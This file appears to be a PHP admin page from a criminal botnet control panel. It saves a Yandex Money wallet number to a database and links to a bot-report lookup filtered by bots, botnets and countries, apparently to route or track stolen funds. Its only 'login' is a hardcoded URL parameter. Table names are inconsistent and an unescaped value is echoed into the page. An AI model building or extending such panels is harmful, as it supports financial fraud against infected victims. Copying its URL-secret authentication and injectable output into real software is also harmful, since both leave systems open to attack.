<html>
    <head>  
    
    <meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
 <title>Yandex Money</title>
    
     <style type="text/css"> html, body {
     background: #ffffff; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>
     
    </head>
 <body>
  <div align="left" ><img src="images/yamoney.png" width=290 /></div>
<br>
<?php
$result='';
if($_GET['login']==="simplerussianmoney")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошелёк обновлен!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина кошелька не верная.";	
		        }
		    $sql_ym = "SELECT `ym` FROM `yadnex` WHERE 1";
			$sql_ym_go = mysql_query($sql_ym);
			$ym_array = mysql_fetch_row($sql_ym_go);
			if($ym_array === false )
			    {
				    $ym = "12345678901234";
					
				    $pre_ym = "INSERT INTO `yadnex` (`ym`) VALUES ('$ym')";
					$pre_ym_go = mysql_query($pre_ym);
				}
			    else
				{
				    $ym = $ym_array[0];
				}


		    $form = "
			         <form method='post' action='ym.php?login=simplerussianmoney'> 
			      
					<font color='#000000'><b>Номер счёта:</b></font>
					 <input type='text' name='ym' size='14' maxlength='14' value='$ym'>
					 <br><br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_ym = "SELECT `ym` FROM `yandex` WHERE 1";
			$sql_ym_go = mysql_query($sql_ym);
			$ym_array = mysql_fetch_row($sql_ym_go);
            $ym_do = $ym_array[0];			
		
		 
		    $ym = mysql_real_escape_string($_POST['ym']);
			
			if(strlen($ym) === 14)
			    {
				}
				else
				{
					 header("Location: ym.php?login=simplerussianmoney&error=1");
					 exit;
				}
			
				
			$up_ym = "UPDATE `yandex` SET `ym`='$ym' WHERE  `ym`='$ym_do'  LIMIT 1;";
			$up_go = mysql_query($up_ym);
			header("Location: ym.php?login=simplerussianmoney&ok=1");
		}
		
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}
?>
<br><br>
<div align="left" ><img src="images/yamoneychk.png" width=290 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $ym; ?>&blt=0" target="blank"><img src="images/ym1.png" ><font color='#000000'><b> Check Yandex Money</b></font></a></div>

</body>
</html>
